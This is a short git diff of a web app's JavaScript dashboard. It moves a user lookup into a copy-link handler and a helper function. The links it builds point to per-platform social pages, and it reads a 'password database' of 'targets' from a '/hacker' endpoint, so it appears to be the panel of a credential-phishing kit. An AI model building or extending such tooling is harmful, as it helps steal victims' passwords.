@@ -2,16 +2,7 @@ import { dbUrl, domain } from "./variables.js";
 
 const user = JSON.parse(sessionStorage.getItem("user"));
 
-if(!user) window.location.href = "../html/login.html"
-
-// getting user details from database
-
-let userFromDb = await fetch(
-  `${dbUrl}/users?name=${user.name}&email=${user.email}`
-)
-userFromDb = await userFromDb.json();
-userFromDb = userFromDb[0];
-
+if (!user) window.location.href = "../html/login.html";
 
 // logout
 
@@ -46,7 +37,15 @@ function copyStringToClipboard(str) {
 }
 
 let copyBtn = document.querySelector(".copy-btn");
-copyBtn.addEventListener("click", (e) => {
+copyBtn.addEventListener("click", async (e) => {
+  // getting user details from database
+
+  let userFromDb = await fetch(
+    `${dbUrl}/users?name=${user.name}&email=${user.email}`
+  );
+  userFromDb = await userFromDb.json();
+  userFromDb = userFromDb[0];
+
   let social = e.target.getAttribute("data-social");
   let link = `${domain}/assets/pages/${social}/index.html?id=${userFromDb.id}`;
 
@@ -62,6 +61,15 @@ document.getElementById("user-name").innerText = user.name;
 // password database setup
 
 const getUserDetail = async () => {
+  // getting user details from database
+
+  let userFromDb = await fetch(
+    `${dbUrl}/users?name=${user.name}&email=${user.email}`
+  );
+  userFromDb = await userFromDb.json();
+  userFromDb = userFromDb[0];
+
+  
   let passwordDb = document.getElementById("password-db");
 
   let targets = await fetch(`${dbUrl}/hacker?userId=${userFromDb.id}`);
